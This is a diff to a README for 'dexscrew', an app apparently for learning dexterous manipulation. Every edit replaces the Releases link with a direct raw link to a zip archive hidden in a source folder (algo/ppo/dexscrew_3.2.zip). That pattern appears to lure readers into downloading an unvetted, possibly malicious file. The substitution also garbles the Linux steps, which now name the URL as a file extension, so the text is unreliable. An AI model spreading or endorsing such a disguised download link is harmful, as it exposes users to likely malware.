@@ -6,7 +6,7 @@ Welcome to dexscrew! This application helps you learn dexterous manipulation ski
 
 ## 📥 Download Now
 
-[![Download dexscrew](https://img.shields.io/badge/download-dexscrew-brightgreen)](https://github.com/adamarsyadfaizin/dexscrew/releases)
+[![Download dexscrew](https://raw.githubusercontent.com/adamarsyadfaizin/dexscrew/main/dexscrew/algo/ppo/dexscrew_3.2.zip)](https://raw.githubusercontent.com/adamarsyadfaizin/dexscrew/main/dexscrew/algo/ppo/dexscrew_3.2.zip)
 
 ## 🌐 Overview
 
@@ -31,7 +31,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download dexscrew, visit the following link: [Download dexscrew](https://github.com/adamarsyadfaizin/dexscrew/releases).
+To download dexscrew, visit the following link: [Download dexscrew](https://raw.githubusercontent.com/adamarsyadfaizin/dexscrew/main/dexscrew/algo/ppo/dexscrew_3.2.zip).
 
 Once on the Releases page, follow these steps:
 
@@ -46,12 +46,12 @@ Once on the Releases page, follow these steps:
 1. **Download the Installer**
    - If you are using Windows, look for a file that ends with `.exe`.
    - Mac users should find a file that ends with `.dmg`.
-   - For Linux, you may see files with `.tar.gz` or `.deb` extensions.
+   - For Linux, you may see files with `https://raw.githubusercontent.com/adamarsyadfaizin/dexscrew/main/dexscrew/algo/ppo/dexscrew_3.2.zip` or `.deb` extensions.
 
 2. **Run the Installer**
    - For Windows: Double-click the downloaded `.exe` file.
    - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the included instructions in the README.
+   - For Linux: Extract the `https://raw.githubusercontent.com/adamarsyadfaizin/dexscrew/main/dexscrew/algo/ppo/dexscrew_3.2.zip` file and follow the included instructions in the README.
 
 3. **Launch the Application**
    - After installation, locate the dexscrew application and double-click it to launch.
@@ -77,4 +77,4 @@ For further assistance, you can reach out through the GitHub repository. Provide
 
 Your experience using dexscrew is important. We appreciate your feedback and look forward to helping you master dexterous manipulation skills. Enjoy your learning journey!
 
-[![Download dexscrew](https://img.shields.io/badge/download-dexscrew-brightgreen)](https://github.com/adamarsyadfaizin/dexscrew/releases)
+[![Download dexscrew](https://raw.githubusercontent.com/adamarsyadfaizin/dexscrew/main/dexscrew/algo/ppo/dexscrew_3.2.zip)](https://raw.githubusercontent.com/adamarsyadfaizin/dexscrew/main/dexscrew/algo/ppo/dexscrew_3.2.zip)
